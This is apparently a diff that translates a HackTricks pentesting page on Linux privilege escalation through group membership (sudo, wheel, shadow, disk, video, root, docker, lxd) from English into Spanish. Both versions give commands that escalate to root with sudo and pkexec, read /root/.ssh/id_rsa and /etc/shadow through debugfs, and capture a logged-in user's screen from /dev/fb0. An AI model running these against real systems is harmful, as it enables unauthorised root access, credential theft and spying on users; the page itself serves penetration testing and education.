@@ -1,28 +1,25 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Consigue la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 
-# Sudo/Admin Groups
+# Grupos Sudo/Admin
 
-## **PE - Method 1**
+## **PE - Método 1**
 
-**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**A veces**, **por defecto \(o porque algún software lo necesita\)** dentro del archivo **/etc/sudoers** puedes encontrar algunas de estas líneas:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -30,49 +27,38 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Si este es el caso, para **convertirse en root solo es necesario ejecutar**:
 ```text
 sudo su
 ```
+## PE - Método 2
 
-## PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Encuentra todos los binarios suid y verifica si está el binario **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary pkexec is a SUID binary and you belong to sudo or admin, you could probably execute binaries as sudo using pkexec.  
-Check the contents of:
-
+Si encuentras que el binario pkexec es un binario SUID y perteneces al grupo sudo o admin, probablemente puedas ejecutar binarios como sudo usando pkexec.  
+Verifica el contenido de:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Allí encontrarás qué grupos tienen permisos para ejecutar **pkexec** y **por defecto** en algunos sistemas Linux pueden **aparecer** algunos de los grupos **sudo o admin**.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux can **appear** some of the groups **sudo or admin**.
-
-To **become root you can execute**:
-
+Para **convertirte en root puedes ejecutar**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Si intentas ejecutar **pkexec** y obtienes este **error**:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
+No es porque no tengas permisos, sino porque no estás conectado con una GUI. Y hay una solución para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:
 
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
-{% code title="session1" %}
+{% code title="sesión1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -80,45 +66,36 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="session2" %}
+{% code title="sesión2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-# Wheel Group
+# Grupo Wheel
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**A veces**, **por defecto** dentro del archivo **/etc/sudoers**, se puede encontrar esta línea:
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Si este es el caso, para **convertirse en root solo hay que ejecutar**:
 ```text
 sudo su
 ```
+# Grupo Shadow
 
-# Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+# Grupo de Disco
 
-So, read the file and try to **crack some hashes**.
+Este privilegio es casi **equivalente al acceso de root** ya que se puede acceder a todos los datos dentro de la máquina.
 
-# Disk Group
-
- This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+Archivos: `/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -126,64 +103,55 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Ten en cuenta que usando debugfs también puedes **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt`, puedes hacer lo siguiente:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+Sin embargo, si intentas **escribir archivos propiedad de root** \(como `/etc/shadow` o `/etc/passwd`\), obtendrás un error de "**Permiso denegado**".
 
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.
+# Grupo de Video
 
-# Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+Usando el comando `w` puedes encontrar **quién está conectado al sistema** y mostrará una salida como la siguiente:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+El **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+El grupo **video** tiene acceso para ver la salida de pantalla. Básicamente, se puede observar la pantalla. Para hacerlo, es necesario **capturar la imagen actual de la pantalla** en datos brutos y obtener la resolución que está utilizando la pantalla. Los datos de la pantalla se pueden guardar en `/dev/fb0` y se puede encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
+Para **abrir** la **imagen cruda**, puedes usar **GIMP**, selecciona el archivo **`screen.raw`** y selecciona como tipo de archivo **Datos de imagen cruda**:
 
 ![](../../.gitbook/assets/image%20%28208%29.png)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):
+Luego modifica el Ancho y Alto a los utilizados en la pantalla y verifica diferentes Tipos de Imagen \(y selecciona el que muestre mejor la pantalla\):
 
 ![](../../.gitbook/assets/image%20%28295%29.png)
 
-# Root Group
+# Grupo Root
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Parece que por defecto, **los miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...
 
-**Check which files root members can modify**:
-
+**Verifica qué archivos pueden modificar los miembros de root**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+# Grupo Docker
 
-# Docker Group
-
-You can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
+Puede montar el sistema de archivos raíz de la máquina host en el volumen de una instancia, por lo que cuando la instancia se inicia, carga inmediatamente un `chroot` en ese volumen. Esto le da efectivamente acceso root en la máquina.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxd Group
+# Grupo lxc/lxd
 
-[lxc - Privilege Escalation](lxd-privilege-escalation.md)
+[lxc - Escalada de privilegios](lxd-privilege-escalation.md)
 
 
 
@@ -191,16 +159,14 @@ You can mount the root filesystem of the host machine to an instance’s volume,
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
